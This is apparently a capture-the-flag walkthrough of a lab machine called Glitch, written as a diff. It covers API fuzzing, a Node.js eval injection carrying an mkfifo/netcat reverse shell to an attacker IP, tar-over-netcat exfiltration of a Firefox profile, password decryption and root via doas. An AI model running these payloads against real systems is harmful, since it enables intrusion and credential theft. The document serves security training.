@@ -1,0 +1,125 @@
+Glitch | 10.10.62.16
+
+found http://10.10.62.16/api/access
+{"token":"dGhpc19pc19ub3RfcmVhbA=="}
+
+http://10.10.62.16/api/items	
+sins	
+0	"lust"
+1	"gluttony"
+2	"greed"
+3	"sloth"
+4	"wrath"
+5	"envy"
+6	"pride"
+errors	
+0	"error"
+1	"error"
+2	"error"
+3	"error"
+4	"error"
+5	"error"
+6	"error"
+7	"error"
+8	"error"
+deaths	
+0	"death"
+
+used burpsuite to change the method from GET to POST
+curl -XPOST http://10.10.62.16/api/items | wc -c
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100    45  100    45    0     0    131      0 --:--:-- --:--:-- --:--:--   131
+45
+
+fuzzing for possible results with the word count of the result of curl
+------------------------------------------------------------------------
+ffuf -X POST -w /usr/share/wordlists/dirb/common.txt -u http://10.10.62.16/api/items?FUZZ=test -fs 45 -mc all
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://10.10.62.16/api/items?FUZZ=test
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: all
+ :: Filter           : Response size: 45
+________________________________________________
+
+cmd                     [Status: 500, Size: 1081, Words: 55, Lines: 11]
+Documents and Settings  [Status: 502, Size: 182, Words: 7, Lines: 8]
+Program Files           [Status: 502, Size: 182, Words: 7, Lines: 8]
+reports list            [Status: 502, Size: 182, Words: 7, Lines: 8]
+:: Progress: [4614/4614] :: Job [1/1] :: 235 req/sec :: Duration: [0:00:20] :: Errors: 0 ::
+
+Trying on the eval function rce on the machine through burp
+POST /api/items?cmd=require("child_process").exec('rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.8.179.136+1337+>/tmp/f') HTTP/1.1
+
+Host: 10.10.62.16
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Connection: close
+
+Cookie: token=value
+
+Upgrade-Insecure-Requests: 1
+
+If-None-Match: W/"a9-0aR6bAfiK/DB+A79vs3kEEVvJNc"
+
+Cache-Control: max-age=0
+
+Got a reverse shell and we are logged in as user and found the user.txt
+
+further enumeration of the files in the /home reveals a .firefox directory which will contain user account and credentials
+using the firefoxdecrypt tool we can decrypt the credentials from the .firefox file 
+
+sending the entire files from the victim machine to attacker machine
+setup a listener on the attacker machine with the options to extract a tar file piped into the netcat command 
+nc -vlp 1234 | tar xf -
+sending the compressed file from the victim machine
+tar cf - .firefox | nc 10.8.179.136 1234
+   
+now decrypt the file using firefoxdecrypt tool                                                                                       
+python3 /opt/firefox_decrypt/firefox_decrypt.py .firefox
+Select the Mozilla profile you wish to decrypt
+1 -> hknqkrn7.default
+2 -> b5w4643p.default-release
+2
+
+Website:   https://glitch.thm
+Username: 'v0id'
+Password: 'love_the_void'
+
+login to v0id using the credentials
+su v0id 
+
+find / -perm -u=s 2>/dev/null
+found a uncommon SUID doas
+googling it reveals that it act as sudo 
+trying it out 
+
+doas 
+usage: doas [-nSs] [-a style] [-C config] [-u user] command [args]
+
+doas -u root /bin/bash 
+
+and we are root 
+cat /root/root.txt
